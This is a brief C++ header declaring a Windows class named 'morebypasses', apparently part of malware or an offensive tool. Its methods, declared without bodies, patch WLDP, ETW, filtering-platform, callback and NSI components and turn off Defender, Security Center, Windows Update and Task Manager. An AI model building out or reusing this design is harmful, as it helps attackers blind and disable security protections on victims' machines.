#pragma once
#include <Windows.h>
#include <string>
#include <vector>

class morebypasses {
private:
    bool patchwldp();
    bool patchingaetw();
    bool patchwfp();
    bool patchcb();
    bool patchnsi();
    bool disablewsc();
    bool disablewu();
    bool disablewdf();
    bool disabletaskmgr();
    bool disabledefender();
public:
    morebypasses();
    ~morebypasses();
    bool bypassall();
    bool bypassspecific(const std::string& bypassname);
    std::vector<std::string> getavailablebypasses();
};